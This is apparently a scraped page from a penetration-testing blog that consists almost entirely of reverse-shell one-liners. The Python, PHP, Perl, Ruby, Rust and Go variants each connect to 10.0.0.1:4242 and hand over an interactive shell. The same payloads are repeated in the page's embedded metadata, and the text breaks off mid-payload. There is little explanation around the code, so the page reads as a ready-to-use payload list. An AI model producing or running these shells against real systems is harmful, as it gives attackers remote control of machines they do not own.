python -c &#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
python -c &#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);os=__import__(&#34;os&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;
IPv4 (No Spaces, Shortened)
python -c &#39;a=__import__;s=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;);p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;);c=a(&#34;subprocess&#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;
IPv4 (No Spaces, Shortened Further)
python -c &#39;a=__import__;s=a(&#34;socket&#34;).socket;o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s();c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;).socket;p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;).socket;c=a(&#34;subprocess&#34;).call;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;
IPv6
python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
IPv6 (No Spaces)
python -c &#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
IPv6 (No Spaces, Shortened)
python -c &#39;a=__import__;c=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;
Windows only (Python2)
python.exe -c &#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;
Windows only (Python3)
python.exe -c &#34;import socket,os,threading,subprocess as sp;p=sp.Popen([&#39;cmd.exe&#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((&#39;10.0.0.1&#39;,4242));threading.Thread(target=exec,args=(\&#34;while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\&#34;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\&#34;while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\&#34;,globals())).start()&#34;
PHP
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;
Perl
perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;

perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;


NOTE: Windows only
perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
Ruby
ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,4242).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;

ruby -rsocket -e&#39;exit if fork;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);loop{c.gets.chomp!;(exit! if $_==&#34;exit&#34;);($_=~/cd (.&#43;)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &#34;failed: #{$_}&#34;}&#39;

NOTE: Windows only
ruby -rsocket -e &#39;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;
Rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect(&#34;10.0.0.1:4242&#34;).unwrap();
    let fd = s.as_raw_fd();
    Command::new(&#34;/bin/sh&#34;)
        .arg(&#34;-i&#34;)
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
Golang
echo &#39;package main;import&#34;os/exec&#34;;import&#34;net&#34;;func main(){c,_:=net.Dial(&#34;tcp&#34;,&#34;10.0.0.1:4242&#34;);cmd:=exec.Command(&#34;/bin/sh&#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go
Resources: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Penetration Testing",
      "item": "http://localhost:1313/posts/penetration-testing/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Web Vulnerability",
      "item": "http://localhost:1313/posts/penetration-testing/webvulnerability/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Python (Linux only)",
      "item": "http://localhost:1313/posts/penetration-testing/webvulnerability/python_revshell/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Python (Linux only)",
  "name": "Python (Linux only)",
  "description": "Reverse Shell IPv4 export RHOST=\u0026#34;10.0.0.1\u0026#34;;export RPORT=4242;python -c \u0026#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\u0026#39; IPv4 (No Spaces) python -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);os=__import__(\u0026#34;os\u0026#34;);pty=__import__(\u0026#34;pty\u0026#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);subprocess=__import__(\u0026#34;subprocess\u0026#34;);os=__import__(\u0026#34;os\u0026#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);subprocess=__import__(\u0026#34;subprocess\u0026#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\u0026#39; IPv4 (No Spaces, Shortened) python -c \u0026#39;a=__import__;s=a(\u0026#34;socket\u0026#34;);o=a(\u0026#34;os\u0026#34;).dup2;p=a(\u0026#34;pty\u0026#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;);p=a(\u0026#34;subprocess\u0026#34;).call;o=a(\u0026#34;os\u0026#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;);c=a(\u0026#34;subprocess\u0026#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;c([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=f(),stdout=f(),stderr=f())\u0026#39; IPv4 (No Spaces, Shortened Further) python -c \u0026#39;a=__import__;s=a(\u0026#34;socket\u0026#34;).socket;o=a(\u0026#34;os\u0026#34;).dup2;p=a(\u0026#34;pty\u0026#34;).spawn;c=s();c.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;).socket;p=a(\u0026#34;subprocess\u0026#34;).call;o=a(\u0026#34;os\u0026#34;).dup2;s=b();s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;).socket;c=a(\u0026#34;subprocess\u0026#34;).call;s=b();s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;c([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=f(),stdout=f(),stderr=f())\u0026#39; IPv6 python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\u0026#34;dead:beef:2::125c\u0026#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; IPv6 (No Spaces) python -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);os=__import__(\u0026#34;os\u0026#34;);pty=__import__(\u0026#34;pty\u0026#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\u0026#34;dead:beef:2::125c\u0026#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; IPv6 (No Spaces, Shortened) python -c \u0026#39;a=__import__;c=a(\u0026#34;socket\u0026#34;);o=a(\u0026#34;os\u0026#34;).dup2;p=a(\u0026#34;pty\u0026#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\u0026#34;dead:beef:2::125c\u0026#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\u0026#34;/bin/sh\u0026#34;)\u0026#39; Windows only (Python2) python.exe -c \u0026#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((\u0026#39;10.0.0.1\u0026#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(\u0026#39;except\u0026#39;, (), {\u0026#39;__enter__\u0026#39;: lambda self: None, \u0026#39;__exit__\u0026#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(\u0026#39;try\u0026#39;, (), {\u0026#39;__enter__\u0026#39;: lambda self: None, \u0026#39;__exit__\u0026#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[\u0026#39;p2s_thread\u0026#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[\u0026#39;s2p_thread\u0026#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[\u0026#39;p\u0026#39;] in [(subprocess.Popen([\u0026#39;\\\\windows\\\\system32\\\\cmd.exe\u0026#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[\u0026#39;s\u0026#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[\u0026#39;p2s\u0026#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[\u0026#39;s\u0026#39;].send(__l[\u0026#39;p\u0026#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[\u0026#39;s\u0026#39;], __l[\u0026#39;p\u0026#39;] in [(s, p)]][0])({}), \u0026#39;p2s\u0026#39;)]][0] for __g[\u0026#39;s2p\u0026#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[\u0026#39;p\u0026#39;].stdin.write(__l[\u0026#39;data\u0026#39;]), __after())[1] if (len(__l[\u0026#39;data\u0026#39;]) \u0026gt; 0) else __after())(lambda: __this()) for __l[\u0026#39;data\u0026#39;] in [(__l[\u0026#39;s\u0026#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[\u0026#39;s\u0026#39;], __l[\u0026#39;p\u0026#39;] in [(s, p)]][0])({}), \u0026#39;s2p\u0026#39;)]][0] for __g[\u0026#39;os\u0026#39;] in [(__import__(\u0026#39;os\u0026#39;, __g, __g))]][0] for __g[\u0026#39;socket\u0026#39;] in [(__import__(\u0026#39;socket\u0026#39;, __g, __g))]][0] for __g[\u0026#39;subprocess\u0026#39;] in [(__import__(\u0026#39;subprocess\u0026#39;, __g, __g))]][0] for __g[\u0026#39;threading\u0026#39;] in [(__import__(\u0026#39;threading\u0026#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(\u0026#39;contextlib\u0026#39;))\u0026#34; Windows only (Python3) python.exe -c \u0026#34;import socket,os,threading,subprocess as sp;p=sp.Popen([\u0026#39;cmd.exe\u0026#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\u0026#39;10.0.0.1\u0026#39;,4242));threading.Thread(target=exec,args=(\\\u0026#34;while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\u0026#34;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\u0026#34;while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\u0026#34;,globals())).start()\u0026#34; PHP php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);shell_exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);`/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3`;\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);system(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);passthru(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);popen(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;, \u0026#34;r\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);\u0026#39; Perl perl -e \u0026#39;use Socket;$i=\u0026#34;10.0.0.1\u0026#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; perl -MIO -e \u0026#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.0.0.1:4242\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; NOTE: Windows only perl -MIO -e \u0026#39;$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.0.0.1:4242\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; Ruby ruby -rsocket -e\u0026#39;f=TCPSocket.open(\u0026#34;10.0.0.1\u0026#34;,4242).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; ruby -rsocket -e\u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;10.0.0.1\u0026#34;,\u0026#34;4242\u0026#34;);loop{c.gets.chomp!;(exit! if $_==\u0026#34;exit\u0026#34;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \u0026#34;failed: #{$_}\u0026#34;}\u0026#39; NOTE: Windows only ruby -rsocket -e \u0026#39;c=TCPSocket.new(\u0026#34;10.0.0.1\u0026#34;,\u0026#34;4242\u0026#34;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; Rust use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; fn main() { let s = TcpStream::connect(\u0026#34;10.0.0.1:4242\u0026#34;).unwrap(); let fd = s.as_raw_fd(); Command::new(\u0026#34;/bin/sh\u0026#34;) .arg(\u0026#34;-i\u0026#34;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); } Golang echo \u0026#39;package main;import\u0026#34;os/exec\u0026#34;;import\u0026#34;net\u0026#34;;func main(){c,_:=net.Dial(\u0026#34;tcp\u0026#34;,\u0026#34;10.0.0.1:4242\u0026#34;);cmd:=exec.Command(\u0026#34;/bin/sh\u0026#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\u0026#39; \u0026gt; /tmp/t.go \u0026amp;\u0026amp; go run /tmp/t.go \u0026amp;\u0026amp; rm /tmp/t.go Resources: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet\n",
  "keywords": [
    "reverse-shell", "post-exploitation", "red-teaming", "ethical-hacking-community", "python-scripting", "powershell-reverse-shell", "code-snippets", "cross-platform", "shell-scripting"
  ],
  "articleBody": "Reverse Shell IPv4 export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' IPv4 (No Spaces) python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' IPv4 (No Spaces, Shortened) python -c 